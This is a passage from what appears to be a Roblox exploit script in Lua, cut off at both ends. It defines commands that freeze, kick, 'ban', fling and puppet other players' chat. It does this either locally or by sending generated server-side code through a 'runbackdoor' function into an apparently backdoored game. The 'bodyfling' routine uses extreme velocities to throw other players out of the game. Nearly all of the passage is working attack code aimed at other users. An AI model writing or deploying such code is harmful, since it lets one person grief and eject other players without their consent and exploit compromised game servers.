							if humanoidRootPart then
								humanoidRootPart.Anchored = true
								local humanoid = character:FindFirstChild("Humanoid")
								if humanoid then
									humanoid.PlatformStand = true
								end
							end
						end
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = true
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = true
							end
						end
					end
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = true
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = true
							end
						end
					end
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local character = v.Character
							if character then
								local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
								if humanoidRootPart then
									humanoidRootPart.Anchored = true
									local humanoid = character:FindFirstChild("Humanoid")
									if humanoid then
										humanoid.PlatformStand = true
									end
								end
							end
						end
					end
				]], player.Name)
				break
			end
		end
	end

	colddddd(bckd)
end)

addcommand("unfreeze", "thaw", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function noiceicebaby(player)
		local character = player.Character
		if character then
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart then
				humanoidRootPart.Anchored = false
				local humanoid = character:FindFirstChild("Humanoid")
				if humanoid then
					humanoid.PlatformStand = false
				end
			end
		end
	end

	local function hotttttt(bckd)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					noiceicebaby(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					noiceicebaby(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						noiceicebaby(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					noiceicebaby(player)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						noiceicebaby(player)
						break
					end
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = false
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = false
							end
						end
					end
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local character = v.Character
						if character then
							local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
							if humanoidRootPart then
								humanoidRootPart.Anchored = false
								local humanoid = character:FindFirstChild("Humanoid")
								if humanoid then
									humanoid.PlatformStand = false
								end
							end
						end
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = false
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = false
							end
						end
					end
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = false
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = false
							end
						end
					end
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local character = v.Character
							if character then
								local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
								if humanoidRootPart then
									humanoidRootPart.Anchored = false
									local humanoid = character:FindFirstChild("Humanoid")
									if humanoid then
										humanoid.PlatformStand = false
									end
								end
							end
						end
					end
				]], player.Name)
				break
			end
		end
	end

	hotttttt(bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

function fakekick(player, reason)
	if not reason then reason = "kicked :<" end
	if player and player:IsA("Player") then
		if player.Character then
			player.Character:Destroy()
			player.Parent = nil
		end
		if reason then
			player:Kick(reason)
		else
			player:Kick()
		end
	end
end

addcommand("kick", "kick", function(target, reason)
	local players = game:GetService("Players"):GetPlayers()

	local function getout(bckd, kickReason)
		if backdoor ~= nil then
			local updatedScript = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			updatedScript = string.gsub(updatedScript, "%%reason%%", kickReason or "kicked :<")
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					fakekick(localPlayer, kickReason)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					fakekick(randomPlayer, kickReason)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						fakekick(player, kickReason)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					fakekick(player, kickReason)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						fakekick(player, kickReason)
						break
					end
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v:Kick("]] .. (reason or "kicked :<") .. [[")
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v:Kick("%s")
					end
				end
			]], randomPlayer.Name, reason or "kicked :<")
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v:Kick("]] .. (reason or "kicked :<") .. [[")
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v:Kick("]] .. (reason or "kicked :<") .. [[")
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v:Kick("%s")
						end
					end
				]], player.Name, reason or "kicked :<")
				break
			end
		end
	end

	getout(bckd, reason)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("ban", "ban", function(target, reason)
	local players = game:GetService("Players"):GetPlayers()

	local function getout(bckd, kickReason)
		if backdoor ~= nil then
			local updatedScript = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			updatedScript = string.gsub(updatedScript, "%%reason%%", kickReason or "banned :<")
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					fakekick(localPlayer, kickReason)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					fakekick(randomPlayer, kickReason)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						fakekick(player, kickReason)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					fakekick(player, kickReason)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						fakekick(player, kickReason)
						break
					end
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v:Kick("]] .. (reason or "banned :<") .. [[")
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v:Kick("%s")
					end
				end
			]], randomPlayer.Name, reason or "banned :<")
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v:Kick("]] .. (reason or "banned :<") .. [[")
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v:Kick("]] .. (reason or "banned :<") .. [[")
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v:Kick("%s")
						end
					end
				]], player.Name, reason or "banned :<")
				break
			end
		end
	end

	getout(bckd, reason)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("bodyfling", "bfling", function(target)
	local Targets = {target}

	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer

	local AllBool = false

	local GetPlayer = function(Name)
		Name = Name:lower()
		if Name == "all" or Name == "others" then
			AllBool = true
			return
		elseif Name == "random" then
			local GetPlayers = Players:GetPlayers()
			if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
			return GetPlayers[math.random(#GetPlayers)]
		elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
			for _,x in next, Players:GetPlayers() do
				if x ~= Player then
					if x.Name:lower():match("^"..Name) then
						return x;
					elseif x.DisplayName:lower():match("^"..Name) then
						return x;
					end
				end
			end
		else
			return
		end
	end

	local Message = function(_Title, _Text, Time)
		game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
	end

	local SkidFling = function(TargetPlayer)
		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		local RootPart = Humanoid and Humanoid.RootPart

		local TCharacter = TargetPlayer.Character
		local THumanoid
		local TRootPart
		local THead
		local Accessory
		local Handle

		if TCharacter:FindFirstChildOfClass("Humanoid") then
			THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
		end
		if THumanoid and THumanoid.RootPart then
			TRootPart = THumanoid.RootPart
		end
		if TCharacter:FindFirstChild("Head") then
			THead = TCharacter.Head
		end
		if TCharacter:FindFirstChildOfClass("Accessory") then
			Accessory = TCharacter:FindFirstChildOfClass("Accessory")
		end
		if Accessoy and Accessory:FindFirstChild("Handle") then
			Handle = Accessory.Handle
		end

		if Character and Humanoid and RootPart then
			if RootPart.Velocity.Magnitude < 50 then
				getgenv().OldPos = RootPart.CFrame
			end
			if THumanoid and THumanoid.Sit and not AllBool then
				return --Message("Error Occurred", "Targeting is sitting", 5)
			end
			if THead then
				workspace.CurrentCamera.CameraSubject = THead
			elseif not THead and Handle then
				workspace.CurrentCamera.CameraSubject = Handle
			elseif THumanoid and TRootPart then
				workspace.CurrentCamera.CameraSubject = THumanoid
			end
			if not TCharacter:FindFirstChildWhichIsA("BasePart") then
				return
			end

			local FPos = function(BasePart, Pos, Ang)
				RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
				Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
				RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
				RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
			end

			local SFBasePart = function(BasePart)
				local TimeToWait = 2
				local Time = tick()
				local Angle = 0

				repeat
					if RootPart and THumanoid then
						if BasePart.Velocity.Magnitude < 50 then
							Angle = Angle + 100

							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
							t()

							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							t()

							FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							t()

							FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
							t()
						else
							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
							t()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
							t()
						end
					else
						break
					end
				until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
			end

			workspace.FallenPartsDestroyHeight = 0/0

			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

			if TRootPart and THead then
				if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
					SFBasePart(THead)
				else
					SFBasePart(TRootPart)
				end
			elseif TRootPart and not THead then
				SFBasePart(TRootPart)
			elseif not TRootPart and THead then
				SFBasePart(THead)
			elseif not TRootPart and not THead and Accessory and Handle then
				SFBasePart(Handle)
			else
				return --Message("Error Occurred", "Target is missing everything", 5)
			end

			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
			workspace.CurrentCamera.CameraSubject = Humanoid

			repeat
				RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
				Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
				Humanoid:ChangeState("GettingUp")
				table.foreach(Character:GetChildren(), function(_, x)
					if x:IsA("BasePart") then
						x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
					end
				end)
				t()
			until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
			workspace.FallenPartsDestroyHeight = getgenv().FPDH
		else
			return --Message("Error Occurred", "Random error", 5)
		end
	end

	getgenv().Welcome = true
	if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end

	if AllBool then
		for _,x in next, Players:GetPlayers() do
			SkidFling(x)
		end
	end

	for _,x in next, Targets do
		if GetPlayer(x) and GetPlayer(x) ~= Player then
			if GetPlayer(x).UserId ~= 1414978355 then
				local TPlayer = GetPlayer(x)
				if TPlayer then
					SkidFling(TPlayer)
				end
			else
				--Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
			end
		elseif not GetPlayer(x) and not AllBool then
			--Message("Error Occurred", "Username Invalid", 5)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("message", "message", function(...)
	text = table.concat({...}, " ")

	local function messag(targetText)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub([[
                local message = Instance.new("Message")
                message.Text = "%message%"
		message.Name = "dontdeleteme"
                message.Parent = game:GetService("Workspace")
            ]], "%%message%%", targetText)
			runbackdoor(backdoor, updatedScript)
		else
			if targetText and targetText ~= "" then
				local message = Instance.new("Message")
				message.Text = targetText
				message.Parent = game:GetService("Workspace")
				message.Name "dontdeleteme"
			end
		end
	end

	messag(text)
end)

addcommand("closemessages", "nomsgs", function()
	local function nomessag()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Message") then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Message") then
					obj:Destroy()
				end
			end
		end
	end

	nomessag()
end)

addcommand("closeunlabeledmessages", "noulmsgs", function()
	local function nomessag()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Message") and obj.Name ~= "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Message") and obj.Name ~= "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	nomessag()
end)

addcommand("closelabeledmessages", "nolmsgs", function()
	local function nomessag()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Message") and obj.Name == "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Message") and obj.Name == "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	nomessag()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("hint", "hint", function(...)
	text = table.concat({...}, " ")

	local function hitn(targetText)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub([[
                local message = Instance.new("Hint")
                message.Text = "%message%"
		message.Name = "dontdeleteme"
                message.Parent = game:GetService("Workspace")
            ]], "%%message%%", targetText)
			runbackdoor(backdoor, updatedScript)
		else
			if targetText and targetText ~= "" then
				local message = Instance.new("Hint")
				message.Text = targetText
				message.Parent = game:GetService("Workspace")
				message.Name = "dontdeleteme"
			end
		end
	end

	hitn(text)
end)

addcommand("closehints", "nohints", function()
	local function nohitn()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Hint") then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Hint") then
					obj:Destroy()
				end
			end
		end
	end

	nohitn()
end)

addcommand("closeunlabeledhints", "noulhints", function()
	local function nohitn()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Hint") and obj.Name ~= "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Hint") and obj.Name ~= "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	nohitn()
end)

addcommand("closelabeledhints", "nolhints", function()
	local function nohitn()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Hint") and obj.Name == "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Hint") and obj.Name == "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	nohitn()
end)

-------------------------------------------------------------------------------------------------------------------------------

local antivoiding = false
local oldfpdh = nil

addcommand("antivoid", "av", function()
	if antivoiding then return end
	antivoiding = true
	oldfpdh = game.Workspace.FallenPartsDestroyHeight
	game.Workspace.FallenPartsDestroyHeight = 0 / 0
end)

addcommand("unantivoid", "unav", function()
	game.Workspace.FallenPartsDestroyHeight = oldfpdh
	antivoiding = false
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("chat", "talk", function(target, ...)
	text = table.concat({...}, " ")
	local ChatService = game:GetService("Chat")
	local Players = game:GetService("Players")

	local function bubl(player)
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end

	if not backdoor then
		local targets = {}

		if not target or target == "" or target == "me" then
			table.insert(targets, Players.LocalPlayer)
		elseif target == "random" then
			local all = Players:GetPlayers()
			if #all > 0 then
				table.insert(targets, all[math.random(1, #all)])
			end
		elseif target == "others" then
			for _, p in ipairs(Players:GetPlayers()) do
				if p ~= Players.LocalPlayer then
					table.insert(targets, p)
				end
			end
		elseif target == "all" then
			targets = Players:GetPlayers()
		else
			for _, p in ipairs(Players:GetPlayers()) do
				if string.find(string.lower(p.Name), string.lower(target)) then
					table.insert(targets, p)
				end
			end
		end

		for _, p in ipairs(targets) do
			bubl(p)
		end
	else
		local bckd = nil
		local esctxt = text:gsub("\\", "\\\\"):gsub('"', '\\"')

		if target == "me" then
			bckd = string.format([[
				local p = game:GetService("Players"):FindFirstChild("%%username%%")
				if p and p.Character and p.Character:FindFirstChild("Head") then
					game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
				end
			]], esctxt)
		elseif target == "random" then
			bckd = string.format([[
				local plrs = game:GetService("Players"):GetPlayers()
				if #plrs > 0 then
					local p = plrs[math.random(1, #plrs)]
					if p.Character and p.Character:FindFirstChild("Head") then
						game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
					end
				end
			]], esctxt)
		elseif target == "others" then
			bckd = string.format([[
				for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
					if p.Name ~= "%%username%%" and p.Character and p.Character:FindFirstChild("Head") then
						game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
					end
				end
			]], esctxt)
		elseif target == "all" then
			bckd = string.format([[
				for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
					if p.Character and p.Character:FindFirstChild("Head") then
						game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
					end
				end
			]], esctxt)
		else
			local matchedNames = {}
			for _, p in ipairs(Players:GetPlayers()) do
				if string.find(string.lower(p.Name), string.lower(target)) then
					table.insert(matchedNames, string.format('"%s"', p.Name))
				end
			end

			if #matchedNames > 0 then
				bckd = string.format([[
					local names = {%s}
					for _, name in ipairs(names) do
						local p = game:GetService("Players"):FindFirstChild(name)
						if p and p.Character and p.Character:FindFirstChild("Head") then
							game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
						end
					end
				]], table.concat(matchedNames, ", "), esctxt)
			end
		end

		if bckd then
			bckd = bckd:gsub("%%username%%", Players.LocalPlayer.Name)
			runbackdoor(backdoor, bckd)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("disco", "disco", function()
	if not isDiscoActive then
		savelighting()
		isDiscoActive = true
		task.spawn(startDiscoMode)
	end
end)

addcommand("undisco", "undisco", function()
	if isDiscoActive then
		isDiscoActive = false
	end
	loadlghting()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("chickenarms", "carms", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game:GetService("Players").LocalPlayer

	local function tposelol(player)
		local character = player.Character
		if character and character:FindFirstChild("Torso") then
			local torso = character.Torso
			if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
				local leftShoulder = torso["Left Shoulder"]
				local rightShoulder = torso["Right Shoulder"]

				leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
					* CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
					* CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
					* CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
				leftShoulder.C1 = CFrame.new(0, 0.5, 0)

				rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
					* CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
					* CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
					* CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
				rightShoulder.C1 = CFrame.new(0, 0.5, 0)
			end
		end
	end

	local function carmm(targetplr)
		local bckd = ""

		if not target or target == "" or target == "me" then
			bckd = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name == "%s" then
                        local character = v.Character
                        if character then
                            local torso = character.Torso
                            if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                local leftShoulder = torso["Left Shoulder"]
                                local rightShoulder = torso["Right Shoulder"]

                                leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                            end
                        end
                    end
                end
            ]], targetplr.Name)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			if randomPlayer then
				bckd = string.format([[
                    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                        if v:IsA("Player") and v.Name == "%s" then
                            local character = v.Character
                            if character then
                                local torso = character.Torso
                                if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                    local leftShoulder = torso["Left Shoulder"]
                                    local rightShoulder = torso["Right Shoulder"]

                                    leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                        * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                    leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                    rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                        * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                    rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                                end
                            end
                        end
                    end
                ]], randomPlayer.Name)
			end
		elseif target == "others" then
			bckd = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name ~= "%s" then
                        local character = v.Character
                        if character then
                            local torso = character.Torso
                            if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                local leftShoulder = torso["Left Shoulder"]
                                local rightShoulder = torso["Right Shoulder"]

                                leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                            end
                        end
                    end
                end
            ]], targetplr.Name)
		elseif target == "all" then
			bckd = [[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") then
